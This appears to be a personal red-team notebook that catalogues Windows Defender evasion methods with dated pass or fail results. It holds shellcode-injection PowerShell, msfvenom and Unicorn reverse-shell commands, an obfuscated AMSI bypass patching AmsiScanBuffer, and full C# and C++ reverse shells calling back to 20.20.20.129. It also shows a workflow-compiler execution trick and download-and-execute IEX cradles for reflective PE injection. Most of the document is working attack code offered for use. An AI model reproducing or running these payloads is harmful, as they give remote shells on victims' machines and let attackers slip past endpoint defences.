## Evasion with powershell using in-memory injection: didn't work against defender (31/7/2022)
```powershell
$code = '
[DllImport("kernel32.dll")]
public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

[DllImport("kernel32.dll")]
public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

[DllImport("msvcrt.dll")]
public static extern IntPtr memset(IntPtr dest, uint src, uint count);'

$winFunc = Add-Type -memberDefinition $code -Name "Win32" -namespace Win32Functions -passthru

# cmd shell
# msfvenom -p windows/x64/shell_reverse_tcp LHOST=20.20.20.129 LPORT=9000 -f powershell

# powershell shell
# msfvenom -p windows/x64/powershell_reverse_tcp lhost=20.20.20.129 lport=9000 -f powershell

[Byte[]];
[Byte[]]$sc = 0xfc,0x48,0x52,0x51,0x56,0x48,...MORE SHELLCODE...,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,0x48,0x8b,0x72,0x50,0x48,0xf;

$size = 0x1000;

if ($sc.Length -gt 0x1000){
    $size = $sc.Length
}

$x = $winFunc::VirtualAlloc(0,$size,0x3000,0x40);

for ($i=0;$i -le ($sc.Length-1);$i++){
    $winFunc::memset([IntPtr]($x.ToInt64()+$i), $sc[$i], 1)
}

$winFunc::CreateThread(0,0,$x,0,0,0)

for (;;) { Start-sleep 60 };
```
---

## shellter: didn't work against defender (31/7/2022)
```bash
dpkg --add-architecture i386
apt update && apt install shellter wine32:i386
```
### note: regarding the error `wine: could not load kernel32.dll, status c0000135` you can delete the config in the home directory
```bash
rm -rf ~/.wine
```

### Step #1: obtain a benign `.exe` program (ex: notepad++, winrar, vlc media player or better yet, one of the applications used by the clients)
### Step #2: run `shellter` from the terminal and go through the wizard steps. select a payload
### Step #3: configure metasploit multi handler according to chosen payload
### Step #4: *before running the handler,* don't forget to set up `auto migrate` to avoid losing the shell
```
set AutoRunScript post/windows/manage/migrate
```

---

## unicorn [github](https://github.com/trustedsec/unicorn): WORKS! (31/7/2022)
### Step #1: use the tool to generate a `powershell_attack.txt` and a `unicorn.rc` files for the payload you choose
```bash
python ./unicorn.py windows/x64/meterpreter/reverse_https 20.20.20.129 443
```
### Step #2: run metasploit with the `-r` flag and pass it the `unicorn.rc` file as an argument
```bash
msfconsole -q -r unicorn.rc
```
### output
```
[*] Processing unicorn.rc for ERB directives. 
resource (unicorn.rc)> use multi/handler         
[*] Using configured payload generic/shell_reverse_tcp
resource (unicorn.rc)> set payload windows/meterpreter/reverse_https
payload => windows/meterpreter/reverse_https
resource (unicorn.rc)> set LHOST 20.20.20.129
LHOST => 20.20.20.129
resource (unicorn.rc)> set LPORT 443
LPORT => 443                                             
resource (unicorn.rc)> set ExitOnSession false
ExitOnSession => false                                   
resource (unicorn.rc)> set AutoVerifySession false
AutoVerifySession => false                               
resource (unicorn.rc)> set AutoSystemInfo false
AutoSystemInfo => false                                                                                           
resource (unicorn.rc)> set AutoLoadStdapi false
AutoLoadStdapi => false                                  
resource (unicorn.rc)> exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
msf6 exploit(multi/handler) > 
[*] Started HTTPS reverse handler on https://20.20.20.129:443
```
### Step #3: run the two commands present in `powershell_attack.txt` where you have code execution on the victim
### here's what a sample `powershell_attack.txt` contains
```shell
# AMSI bypass code - run in same process as unicorn second stage
powershell /w 1 /C "sv cl -;sv Ovz ec;sv aUM ((gv cl).value.toString()+(gv Ovz).value.toString());powershell (gv aUM).value.toString() ('JABRAH...A LOT OF BASE64...AANgApAA==')"

# actual unicorn payload
powershell /w 1 /C "sv cl -;sv Ovz ec;sv aUM ((gv cl).value.toString()+(gv Ovz).value.toString());powershell (gv aUM).value.toString() ('JABGAGMAPQAnA...A LOT OF BASE64...EAdABGUA')"
```

### AMSI bypass code (obfuscated)
```powershell
$QtJkcj = @"
using System;
using System.Runtime.InteropServices;
public class Win32 {
	[DllImport("k"+"e"+"rnel32")]public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	[DllImport("k"+"e"+"rnel32")] public static extern IntPtr LoadLibrary(string name);
	[DllImport("k"+"e"+"rnel32")] public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@
Add-Type $QtJkcj;
$rzBqCSwe = [Win32]::GetProcAddress([Win32]::LoadLibrary("Am"+"s"+"i."+"d"+"ll"), "Am"+"s"+"iSc"+"a"+"nBu"+"f"+"fer");
$sLLrKzfP = 0;
[Win32]::VirtualProtect($rzBqCSwe, [uint32][uint32]5, 0x40, [ref]$sLLrKzfP);
$vRfPAG = ("}xLDdgMsOJI, }xMLHZZFmHh, }x}}, }x}7, }x8}, }xC3").replace("MLHZZFmHh", "57").replace("}", "0").replace("LDdgMsOJI", "B8");
$vRfPAG = [Byte[]]($vRfPAG).split(",");
[System.Runtime.InteropServices.Marshal]::Copy($vRfPAG, 0, $rzBqCSwe, 6);
```

### unicorn payload (obfuscated): some version of in-memory injection
```c
[DllImport(("msvcr"+"t"+".dll"))]public static extern IntPtr calloc(uint dwSize, uint amount);
[DllImport("k"+"e"+"rnel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
[DllImport("k"+"e"+"rnel32.dll")]public static extern IntPtr VirtualProtect(IntPtr lpStartAddress, uint dwSize, uint flNewProtect, out uint aCX);
[DllImport("msvcr"+"t"+".dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);
```

---

## Veil framework: didn't work against defender (31/7/2022)
### installation
```bash
apt-get install veil
usr/share/veil/config/setup.sh --force --silent
```
### run it from terminal
```bash
veil
```

---

## C# Reverse shell: worked against defender (31/7/2022)
### Step #1: create a `rev.cs.txt` file with the below code
```C#
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;

namespace ConnectBack
{
	public class Program
	{
		static StreamWriter streamWriter;

		public static void Main(string[] args)
		{
			using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							//strInput.Append("\n");
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
}
```
### Step #2: compile with the native `csc.exe` .NET compiler
```shell
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back.exe C:\Users\user\Desktop\back.cs.txt
```
### Step #3: use the generated `back.exe` file like below
```shell
back.exe <ATTACKER_IP> <PORT>
```

---
## Execution with compiler: failed against defender (31/7/2022)

### Step #1: create the below xml
```xml
<?xml version="1.0" encoding="utf-8"?>
<CompilerInput xmlns:i="http://www.w3.org/2001/XMLSchema-instance" xmlns="http://schemas.datacontract.org/2004/07/Microsoft.Workflow.Compiler">
  <files xmlns:d2p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays">
    <d2p1:string>Rev.Shell</d2p1:string>
  </files>
  <parameters xmlns:d2p1="http://schemas.datacontract.org/2004/07/System.Workflow.ComponentModel.Compiler">
    <assemblyNames xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <compilerOptions i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <coreAssemblyFileName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></coreAssemblyFileName>
    <embeddedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <evidence xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Security.Policy" i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <generateExecutable xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</generateExecutable>
    <generateInMemory xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">true</generateInMemory>
    <includeDebugInformation xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</includeDebugInformation>
    <linkedResources xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <mainClass i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <outputName xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler"></outputName>
    <tempFiles i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <treatWarningsAsErrors xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">false</treatWarningsAsErrors>
    <warningLevel xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler">-1</warningLevel>
    <win32Resource i:nil="true" xmlns="http://schemas.datacontract.org/2004/07/System.CodeDom.Compiler" />
    <d2p1:checkTypes>false</d2p1:checkTypes>
    <d2p1:compileWithNoCode>false</d2p1:compileWithNoCode>
    <d2p1:compilerOptions i:nil="true" />
    <d2p1:generateCCU>false</d2p1:generateCCU>
    <d2p1:languageToUse>CSharp</d2p1:languageToUse>
    <d2p1:libraryPaths xmlns:d3p1="http://schemas.microsoft.com/2003/10/Serialization/Arrays" i:nil="true" />
    <d2p1:localAssembly xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.Reflection" i:nil="true" />
    <d2p1:mtInfo i:nil="true" />
    <d2p1:userCodeCCUs xmlns:d3p1="http://schemas.datacontract.org/2004/07/System.CodeDom" i:nil="true" />
  </parameters>
</CompilerInput>
```
### Step #2: creat the below C# reverse shell with the name `Rev.Shell` and set the `lhost` and `lport`
```C#
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Workflow.Activities;

	public class Program : SequentialWorkflowActivity
	{
		static StreamWriter streamWriter;

		public Program()
		{
			using(TcpClient client = new TcpClient("20.20.20.129", 80))
			{
				using(Stream stream = client.GetStream())
				{
					using(StreamReader rdr = new StreamReader(stream))
					{
						streamWriter = new StreamWriter(stream);
						
						StringBuilder strInput = new StringBuilder();

						Process p = new Process();
						p.StartInfo.FileName = "cmd.exe";
						p.StartInfo.CreateNoWindow = true;
						p.StartInfo.UseShellExecute = false;
						p.StartInfo.RedirectStandardOutput = true;
						p.StartInfo.RedirectStandardInput = true;
						p.StartInfo.RedirectStandardError = true;
						p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
						p.Start();
						p.BeginOutputReadLine();

						while(true)
						{
							strInput.Append(rdr.ReadLine());
							p.StandardInput.WriteLine(strInput);
							strInput.Remove(0, strInput.Length);
						}
					}
				}
			}
		}

		private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(outLine.Data))
            {
                try
                {
                    strOutput.Append(outLine.Data);
                    streamWriter.WriteLine(strOutput);
                    streamWriter.Flush();
                }
                catch (Exception err) { }
            }
        }

	}
```
### Step #3: run the .NET compiler with the locations of both files
```shell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe Rev.xml Rev.Shell
```

---

## C++ reverse shell: worked against defender (31/7/2022)
### Step #1: make sure mingw-w64 is installed on your kali
```bash
apt-get install mingw-w64
```
### Step #2: create the `rev.cpp` file with the below contents. remember to edit the `lhost` and `lport`
```C++
//Author : Paranoid Ninja
//Email  : paranoidninja@protonmail.com
//Blog   : https://scriptdotsh.com/index.php/2018/09/04/malware-on-steroids-part-1-simple-cmd-reverse-shell/

//Compile with g++/i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
//The effective size with statically compiled code should be around 13 Kb

#include <winsock2.h>
#include <windows.h>
#include <ws2tcpip.h>
#pragma comment(lib, "Ws2_32.lib")
#define DEFAULT_BUFLEN 1024


void RunShell(char* C2Server, int C2Port) {
    while(true) {
        Sleep(5000);    // 1000 = One Second

        SOCKET mySocket;
        sockaddr_in addr;
        WSADATA version;
        WSAStartup(MAKEWORD(2,2), &version);
        mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);
        addr.sin_family = AF_INET;
   
        addr.sin_addr.s_addr = inet_addr(C2Server);  //IP received from main function
        addr.sin_port = htons(C2Port);     //Port received from main function

        //Connecting to Proxy/ProxyIP/C2Host
        if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {
            closesocket(mySocket);
            WSACleanup();
            continue;
        }
        else {
            char RecvData[DEFAULT_BUFLEN];
            memset(RecvData, 0, sizeof(RecvData));
            int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
            if (RecvCode <= 0) {
                closesocket(mySocket);
                WSACleanup();
                continue;
            }
            else {
                char Process[] = "cmd.exe";
                STARTUPINFO sinfo;
                PROCESS_INFORMATION pinfo;
                memset(&sinfo, 0, sizeof(sinfo));
                sinfo.cb = sizeof(sinfo);
                sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
                sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;
                CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);
                WaitForSingleObject(pinfo.hProcess, INFINITE);
                CloseHandle(pinfo.hProcess);
                CloseHandle(pinfo.hThread);

                memset(RecvData, 0, sizeof(RecvData));
                int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);
                if (RecvCode <= 0) {
                    closesocket(mySocket);
                    WSACleanup();
                    continue;
                }
                if (strcmp(RecvData, "exit\n") == 0) {
                    exit(0);
                }
            }
        }
    }
}
//-----------------------------------------------------------
//-----------------------------------------------------------
//-----------------------------------------------------------
int main(int argc, char **argv) {
    FreeConsole();
    if (argc == 3) {
        int port  = atoi(argv[2]); //Converting port in Char datatype to Integer format
        RunShell(argv[1], port);
    }
    else {
        char host[] = "20.20.20.129";
        int port = 9000;
        RunShell(host, port);
    }
    return 0;
}
```
### Step #3: compile to exe like below (size of exe should be around 13 Kb) (you can use `upx` to shrink it as well)
```bash
i686-w64-mingw32-g++ rev.cpp -o revcpp.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```

---

## Reflective PE Injection: didn't work against defender (2/8/2022)
### Source: [video by adam chester](https://www.youtube.com/watch?v=byMBx4q-vYo)

### Step #1: obtain the `Invoke-RelfectivePEInjection.ps1` from [here](https://github.com/PowerShellMafia/PowerSploit/blob/master/CodeExecution/Invoke-ReflectivePEInjection.ps1) and inject it into memory:
```powershell
IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/Invoke-RelfectivePEInjection.ps1')
```
### Step #2: convert the exe to `base64`. here's how it can be done using PowerShell:
```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes('path\to\exe')) > exe.bin
```
### Step #3: retrive the base64 and store it in a variable
```powershell
$b = IEX(New-Object Net.webClient).downloadString('http://<LHOST>:<LPORT>/exe.bin')
```
### Step #4: get the binary back from base64 format and save it into a variable
```powershell
$c = [System.Convert]::FromBase64String($b)
```
### Step #5: call `Invoke-RelfectivePEInjection` and specify the flag `-PEBytes` with the `$c` variable as an argument
```powershell
Invoke-RelfectivePEInjection -PEBytes $c
```

---
